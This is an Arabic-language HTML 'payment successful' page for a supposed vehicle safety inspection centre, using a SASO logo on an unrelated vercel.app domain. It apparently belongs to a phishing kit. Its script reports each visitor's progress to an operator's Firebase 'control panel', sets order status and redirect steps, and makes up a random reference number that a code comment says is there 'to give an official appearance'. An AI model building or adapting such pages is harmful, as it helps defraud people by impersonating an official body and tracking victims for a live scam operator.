<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تم الدفع بنجاح - مركز سلامة المركبات</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root { --main-green: #1e7344; --bg-light: #f7f8fa; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }

        .success-container {
            background: #fff;
            width: 100%;
            max-width: 350px;
            border-radius: 20px;
            padding: 30px 20px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.05);
            text-align: center;
        }

        .success-icon-box {
            width: 100%;
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
            margin-top: -15px;
        }
        
        .success-circle {
            width: 70px; 
            height: 70px; 
            background-color: #e8f5e9; 
            border-radius: 50%; 
            display: flex; 
            justify-content: center; 
            align-items: center;
        }

        h2 { font-size: 18px; color: #333; margin-bottom: 8px; font-weight: bold; }
        p { font-size: 13px; color: #777; line-height: 1.5; margin-bottom: 25px; }

        .order-details {
            background-color: #fafafa;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 25px;
            text-align: right;
            border: 1px solid #f0f0f0;
        }

        .detail-item {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            margin-bottom: 6px;
            color: #666;
        }

        .detail-item b { color: #333; }

        .btn-home {
            width: 100%;
            background-color: var(--main-green);
            color: white;
            border: none;
            border-radius: 10px;
            padding: 13px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: 0.3s;
        }
        .btn-home:hover { opacity: 0.9; }

        .footer-logo {
            margin-top: 25px;
            width: 100%;
            max-width: 90px;
            opacity: 0.8;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
    </style>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="منصة حجز مواعيد الفحص الفني الدوري للمركبات">
    <meta name="keywords" content="فحص سيارات, حجز موعد, فحص دوري">
    <meta name="author" content="مركز سلامة المركبات">
    <meta name="robots" content="index, follow">
    <meta property="og:type" content="website">
    <meta property="og:title" content="منصة حجز مواعيد الفحص الفني">
    <meta property="og:description" content="منصة موحدة لحجز مواعيد الفحص الفني الدوري">
    <meta property="og:url" content="https://jaufasnfsa.vercel.app">
    <meta property="og:site_name" content="مركز سلامة المركبات">
    <meta name="theme-color" content="#2d5016">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
</head>
<body>

    <div class="success-container">
        <div class="success-icon-box">
            <div class="success-circle">
                <span style="font-size: 35px; color: #1e7344;">✓</span>
            </div>
        </div>
        
        <h2>تمت العملية بنجاح</h2>
        <p>شكرًا لك! تم استلام دفعتك بنجاح وجاري إصدار إيصال الخدمة الخاص بك وإرساله عبر الرسائل النصية.</p>

        <div class="order-details">
            <div class="detail-item">
                <span>رقم العملية:</span>
                <b id="refNumber">#VSC-######</b>
            </div>
            <div class="detail-item">
                <span>المبلغ المدفوع:</span>
                <b>115.00 ريال</b>
            </div>
            <div class="detail-item">
                <span>حالة الخدمة:</span>
                <b style="color: var(--main-green);">مكتملة</b>
            </div>
        </div>

        <a href="index.html" class="btn-home">العودة للرئيسية</a>

        <img src="https://i.ibb.co/7JPt9dQG/saso-logo.png" class="footer-logo" alt="SASO Logo">
    </div>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
            projectId: "saso-inspection" 
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const v_id = localStorage.getItem('v_id');

        // توليد رقم مرجعي عشوائي لإضفاء طابع الرسمية
        document.getElementById('refNumber').innerText = "#VSC-" + Math.floor(Math.random() * 900000 + 100000);

        if (v_id) {
            // تحديث الحالة النهائية في لوحة التحكم
            database.ref('live_sessions/' + v_id).update({
                current_page: "إتمام الدفع بنجاح ✅",
                last_seen: new Date().getTime()
            });

            // تحديث حالة الطلب إلى مكتمل
            database.ref('orders/' + v_id).update({
                status: "Success_Completed",
                next_step: "none", // لإيقاف أي تحويل تلقائي من صفحة الانتظار
                last_update: new Date().toLocaleString()
            });
        }
    </script>
</body>
</html>
